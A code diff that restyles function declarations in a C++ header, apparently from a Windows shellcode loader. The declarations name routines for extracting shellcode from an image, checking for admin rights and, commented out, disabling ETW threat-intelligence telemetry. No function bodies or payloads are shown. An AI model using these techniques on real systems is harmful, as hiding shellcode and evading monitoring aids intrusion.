@@ -16,17 +16,17 @@
 #pragma comment(lib, "gdiplus.lib")
 
 
-LPCWSTR charToLPCWSTR(const char* charString);
-LPSTR charToLPSTR(const char* str);
-LPWSTR charToLPWSTR(const char* charString);
+auto charToLPCWSTR(const char* charString) -> LPCWSTR;
+auto charToLPSTR(const char* str) -> LPSTR;
+auto charToLPWSTR(const char* charString) -> LPWSTR;
 
-void DebugPrintA(const char* format, ...);
-void DebugPrintW(const wchar_t* format, ...);
-DWORD myGetCurrentThreadId();
-DWORD myGetCurrentProcessId();
-ULONG64 AR_getTickcount64();
-wchar_t* _strstri_w(const wchar_t* s, const wchar_t* sub_s);
-BOOL ExtractShellcodeFromImage(LPCWSTR imagePath, PBYTE *shellcode, DWORD *size);
+auto DebugPrintA(const char* format, ...) -> void;
+auto DebugPrintW(const wchar_t* format, ...) -> void;
+auto myGetCurrentThreadId() -> DWORD;
+auto myGetCurrentProcessId() -> DWORD;
+auto AR_getTickcount64() -> ULONG64;
+auto _strstri_w(const wchar_t* s, const wchar_t* sub_s) -> wchar_t*;
+auto ExtractShellcodeFromImage(LPCWSTR imagePath, PBYTE *shellcode, DWORD *size) -> BOOL;
 
 
 
@@ -113,9 +113,9 @@ public:
 }()
 
 
-std::string WideToUtf8(const std::wstring& wstr);
-std::string EscapeJsonString(const std::string& input);
-std::string Base64Decode(const std::string& encoded);
-void custom_sleep(int milliseconds);
-BOOL IsRunningAsAdmin();
+auto WideToUtf8(const std::wstring& wstr) -> std::string;
+auto EscapeJsonString(const std::string& input) -> std::string;
+auto Base64Decode(const std::string& encoded) -> std::string;
+auto custom_sleep(int milliseconds) -> void;
+auto IsRunningAsAdmin() -> BOOL;
 // auto DisableETWTI() -> BOOLEAN; 
